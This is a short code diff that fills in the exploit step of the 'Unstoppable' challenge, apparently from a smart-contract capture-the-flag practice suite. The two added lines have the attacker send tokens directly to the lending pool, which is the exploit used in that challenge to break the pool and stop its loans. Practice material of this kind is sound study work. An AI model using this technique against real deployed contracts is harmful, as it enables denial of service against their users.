@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let sigToken = this.token.connect(attacker)
+        await sigToken.transfer(this.pool.address,ethers.utils.parseEther('1'))
     });
 
     after(async function () {
